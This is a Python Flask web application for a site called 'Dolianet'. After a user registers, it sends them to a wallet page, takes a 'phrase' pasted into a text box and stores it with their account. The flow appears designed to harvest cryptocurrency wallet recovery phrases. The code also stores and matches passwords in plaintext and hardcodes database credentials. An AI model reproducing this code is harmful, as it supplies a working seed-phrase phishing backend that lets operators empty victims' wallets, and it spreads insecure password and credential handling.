#!/usr/bin/env python3
import os
from flask import Flask, current_app, render_template, request, url_for, redirect
from flask_sqlalchemy import SQLAlchemy

from sqlalchemy.sql import func

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] =\
        "mysql://dolianet_dev:senjuu@localhost:3306/dolianet"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False


db = SQLAlchemy(app)

with app.app_context():
    session = db.session

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_name = db.Column(db.String(100), nullable=False)
    user_phrase = db.Column(db.String(100), nullable=True)
    email = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(255), nullable=False)
    created_at = db.Column(db.DateTime(timezone=True),
                           server_default=func.now())

    def __repr__(self):
        return f'<User {self.user_name}>'

    # Defining the app routes

    @app.route('/', methods=["POST", "GET"], strict_slashes=False)
    def homepage():
        """Renders the landing page of Dolianet"""
        return render_template("index-2.html")

    @app.route('/index-2.html', methods=['POST', 'GET'], strict_slashes=False)
    def redirect_homepage():
        """Renders the homepage again"""
        return render_template("index-2.html")

    @app.route('/login.html', strict_slashes=False)
    def login():
        """Renders the login page"""
        return render_template("login.html")
    
    @app.route('/register.html', strict_slashes=False)
    def register():
        """Renders the register page"""
        return render_template("register.html")

    @app.route('/wallet.html', strict_slashes=False)
    def wallet():
        """Renders the wallet page"""
        email = request.args.get('email')
        return render_template("wallet.html", email=email)

    @app.route('/dashboard.html', strict_slashes=False)
    def hello_dashboard():
        """Renders the dashboard page"""
        user_name = request.args.get('user_name')
        return render_template("main-dashboard.html", user_name=user_name)

    # Defining APIs
    @app.route('/app.py', methods=["POST", "GET", "PATCH"], strict_slashes=False)
    def registration():
        """Handles the login, register and collect phrase functionalities"""
        if "login" in request.form:
            if request.method == "POST":
                email = request.form['email']
                password = request.form['password']
                try:
                    user = User.query.filter_by(email=email, password=password).first()
                    if user:
                        print(user)
                        return redirect(url_for("hello_dashboard", user_name=user.user_name))
                        #else:
                            #print("Error: Wrong password")
                            #return redirect(url_for("login"))
                    else:
                        print("Error: Sorry wrong details")
                        return redirect(url_for("login"))
                except Exception as err:
                    print(err)

        elif "register" in request.form:
            if request.method == "POST":
                user_name = request.form['uname']
                email = request.form['email']
                password = request.form['password']
                try:
                    register_user = User(user_name=user_name, email=email, password=password)
                    if register_user:
                        session.add(register_user)
                        session.commit()
                        print(register_user.user_name)
                        return redirect(url_for("wallet", email=register_user.email))
                    else:
                        session.rollback()
                        print("Error: Could not register user account")
                        return redirect(url_for("register"))
                except Exception as err:
                    print(err)

    @app.route('/app.py/<email>', methods=['GET', 'POST', 'PATCH'], strict_slashes=False)
    def collect_phrase(email):
        if "wallet" in request.form:
            user_phrase = request.form['textArea-box']
            if request.method == "POST":
                #user_phrase = request.form['textArea-box']
                try:
                    user = User.query.filter_by(email=email).first()
                    if user:
                        user.user_phrase = user_phrase
                        session.add(user)
                        session.commit()
                        print(user.user_phrase)
                        return redirect(url_for('login'))
                    else:
                        print("Error: Something went wrong")
                        return redirect(url_for("wallet"))
                except Exception as err:
                    print(err)
